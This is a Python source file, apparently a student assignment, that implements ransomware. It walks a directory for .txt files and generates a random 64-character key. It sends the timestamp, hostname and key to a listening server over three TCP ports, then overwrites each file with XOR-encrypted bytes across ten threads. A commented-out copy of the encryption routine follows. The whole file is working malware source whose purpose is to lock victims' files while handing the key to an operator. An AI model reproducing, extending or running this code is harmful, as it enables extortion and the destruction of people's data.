import os
import random
import socket
from datetime import datetime
import threading
from queue import Queue

# safe = input("Enter safe word: ")
# if safe != 'start':
#     quit()

def whole():
 #file to encrypt

    encrypted_ext = ('.txt')

    #all files from machine
    file_paths = []
    for root, dirs, files in os.walk("E:\Python Semester 2\Assignment\Test"):
        for file in files:
            file_path, file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)

    #generate key
    key = ''
    encryption_level = 512 // 8
    char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789<>?,./:;[]}{|'
    char_pool_len = len(char_pool)

    for i in range(encryption_level):
        key += char_pool[random.randint(0, char_pool_len-1)]

    hostname = os.getenv("COMPUTERNAME")

    # connect to server
    ip_address = socket.gethostbyname(hostname)
    port1 = 5666
    port2 = 5678
    port3 = 5679
    time = datetime.now()
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip_address, port1))
            s.send(f'[{time}]'.encode('utf-8'))

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip_address, port2))
            s.send(f'{hostname}'.encode('utf-8'))

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip_address, port3))
            s.send(f'{key}'.encode('utf-8'))
        def encrypt(key):
            while q.not_empty:
                file = q.get()
                index = 0
                max_index =len(key) - 1
                try:
                    with open(file, 'rb') as f:
                        data = f.read()
                    with open(file,'w') as f:
                        f.write('')

                    for byte in data:
                        xor_byte = byte ^ ord(key[index])
                        with open(file, 'ab') as f:
                            f.write(xor_byte.to_bytes(1, 'little'))
                        if index >= max_index:
                            index = 0 
                        else: 
                            index += 1
                except:
                    print(f"Failed to encrypt {file}")
                q.task_done()
        q = Queue()
        for file in file_paths:
            q.put(file)

        for i in range(10):
            thread = threading.Thread(target=encrypt, args=(key,), daemon=True)
            thread.start()

        q.join()
    except:
        print("Our servers are busy right now.")

        


    # # Encrypt file
    # def encrypt(key):
    #     while q.not_empty:
    #         file = q.get()
    #         index = 0
    #         max_index =len(key) - 1
    #         try:
    #             with open(file, 'rb') as f:
    #                 data = f.read()
    #             with open(file,'w') as f:
    #                 f.write('')

    #             for byte in data:
    #                 xor_byte = byte ^ ord(key[index])
    #                 with open(file, 'ab') as f:
    #                     f.write(xor_byte.to_bytes(1, 'little'))
    #                 if index >= max_index:
    #                     index = 0 
    #                 else: 
    #                     index += 1
    #         except:
    #             print(f"Failed to encrypt {file}")
    #         q.task_done()


    # q = Queue()
    # for file in file_paths:
    #     q.put(file)

    # for i in range(10):
    #     thread = threading.Thread(target=encrypt, args=(key,), daemon=True)
    #     thread.start()

    # q.join()
    # print("Encryption was sucessful")
